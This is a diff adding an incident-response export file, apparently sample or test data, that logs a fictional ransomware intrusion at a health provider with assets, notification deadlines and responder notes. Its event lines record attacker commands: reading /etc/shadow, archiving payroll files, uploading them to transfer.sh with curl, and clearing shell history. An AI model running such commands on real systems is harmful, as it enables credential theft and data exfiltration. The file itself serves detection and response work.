@@ -1,0 +1,35 @@
+ark-export	1
+incident	Ransomware on FS-01, Brightline Health
+opened	1794104888
+written	1794115889
+station	Dana Kessler	manager
+phase	DETECT
+integrity	0	0
+member	1794104888	Dana Kessler	manager
+member	1794104918	Marcus Hale	member
+asset	1794105868	NAS-02	OTHER	-	18000	CLEAN
+asset	1794105858	HR-DB	PII	TX	?	SUSPECTED
+asset	1794105848	imaging-archive	PHI	-	412	EXFILTRATED
+asset	1794105838	FS-01	PII	TX	4120	ENCRYPTED
+clock	1796697838	Texas Attorney General	Tex. Bus. & Com. Code 521.053	0	720
+clock	1799289838	Texas residents	Tex. Bus. & Com. Code 521.053	0	1440
+clock	1799289848	HIPAA: individuals	45 CFR 164.404	0	1440
+entry	1794104888	genesis	DETECT	Dana Kessler	-	Opened the incident: Ransomware on FS-01, Brightline Health
+entry	1794104918	member		Dana Kessler	-	Admitted Marcus Hale to the team
+entry	1794104948	note	DETECT	Dana Kessler	-	Night shift reports slow shares on FS-01. Watching the server log.
+entry	1794105008	chat	DETECT	Marcus Hale	-	On it. I have the server log open.
+entry	1794105838	scope	DETECT	Dana Kessler	-	FS-01: 4,120 PII records of TX residents, ENCRYPTED
+entry	1794105848	scope	DETECT	Dana Kessler	-	imaging-archive: 412 PHI records, EXFILTRATED
+entry	1794105858	scope	DETECT	Dana Kessler	-	HR-DB: unknown number of PII records of TX residents, SUSPECTED
+entry	1794105868	scope	DETECT	Dana Kessler	-	NAS-02: 18,000 OTHER records, CLEAN
+event	1794105188	53577402	login	marcus	fs-01	1	a login outside working hours	-	0	ssh from 10.0.4.22
+event	1794105218	e06f9cd0	shell	marcus	fs-01	0		-	0	df -h /srv
+event	1794105488	c7eb4ef7	fail	admin	fs-01	1	a wrong password	-	0	ssh password from 185.220.101.7
+event	1794105528	587cffd8	login	svc-backup	fs-01	1	a login outside working hours	-	0	ssh from 185.220.101.7
+event	1794105588	f3282153	sudo	svc-backup	fs-01	2	reads or changes the password hashes	Marcus Hale	1794105788	cat /etc/shadow
+event	1794105648	c375b203	shell	svc-backup	fs-01	1	packs files into an archive	-	0	tar czf /tmp/.p.tgz /srv/shares/payroll
+event	1794105688	be99c258	shell	svc-backup	fs-01	2	uploads files off the server	-	0	curl -T /tmp/.p.tgz https://transfer.sh/p.tgz
+event	1794105718	7cc57ac5	shell	svc-backup	fs-01	2	clears the shell history	-	0	history -c
+entry	1794105788	alert	DETECT	Marcus Hale	f3282153	svc-backup on fs-01 at 23:31: cat /etc/shadow (it reads or changes the password hashes)
+entry	1794105948	network	DETECT	Dana Kessler	-	Cut this machine off the internet (panel button). Any link a hacker had through it is gone; the team continues over the relay.
+entry	1794115548	network	DETECT	Dana Kessler	-	Restored internet on this machine (panel button).
